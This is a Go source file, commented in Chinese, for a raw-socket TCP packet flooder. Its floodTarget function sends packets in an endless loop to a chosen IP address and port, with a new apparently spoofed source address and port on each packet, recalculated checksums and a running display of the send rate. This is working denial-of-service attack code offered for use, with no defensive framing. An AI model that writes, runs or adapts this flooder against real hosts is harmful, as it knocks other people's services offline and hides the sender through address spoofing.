package main

import (
	"fmt"
	"reflect"
	"syscall"
	"time"
)

// 定义错误计数器和统计信息
type Stats struct {
	PacketsSent   uint64
	ErrorCount    uint64
	LastErrorTime time.Time
	StartTime     time.Time
}

var stats = Stats{
	StartTime: time.Now(),
}

func (tcp *TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
	err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
	if err != nil {
		stats.ErrorCount++
		stats.LastErrorTime = time.Now()
		
		// 仅当错误不太频繁时才打印错误，避免刷屏
		if stats.ErrorCount < 10 || stats.ErrorCount%100 == 0 {
			fmt.Printf("发送错误: %v\n", err)
		}
	} else {
		stats.PacketsSent++
		
		// 每发送1000个包显示一次统计信息
		if stats.PacketsSent%1000 == 0 {
			elapsed := time.Since(stats.StartTime).Seconds()
			rate := float64(stats.PacketsSent) / elapsed
			fmt.Printf("已发送: %d 包, 错误: %d, 速率: %.2f 包/秒\n", 
				stats.PacketsSent, stats.ErrorCount, rate)
		} else {
			// 每发送一个包打印一个点，避免大量输出
			fmt.Printf(".")
		}
	}
}

func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {
	var dest [4]byte
	copy(dest[:], tcp.DST[:4])
	
	// 创建原始套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		panic(fmt.Errorf("创建原始套接字失败: %v", err))
	}
	defer syscall.Close(fd)
	
	// 绑定到网络接口
	err = syscall.BindToDevice(fd, tcp.Adapter)
	if err != nil {
		panic(fmt.Errorf("绑定到网络接口 %s 失败: %v", tcp.Adapter, err))
	}

	// 设置套接字选项以提高性能
	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
	
	// 准备目标地址
	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	// 显示开始信息
	fmt.Printf("开始发送数据包到 %d.%d.%d.%d:%d\n", 
		tcp.DST[0], tcp.DST[1], tcp.DST[2], tcp.DST[3], tcp.DstPort)
	
	// 主循环
	for {
		// 生成新的源IP和源端口
		tcp.genIP()
		
		// 计算新的校验和
		tcp.calcTCPChecksum()
		
		// 构建数据包
		tcp.buildPayload(rType, rVal)
		
		// 发送数据包
		tcp.rawSocket(fd, addr)
		
		// 短暂延时，防止过度使用CPU
		if stats.PacketsSent%100 == 0 {
			time.Sleep(time.Millisecond)
		}
	}
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
	tcp.Payload = make([]byte, 60)
	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					tcp.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}
}
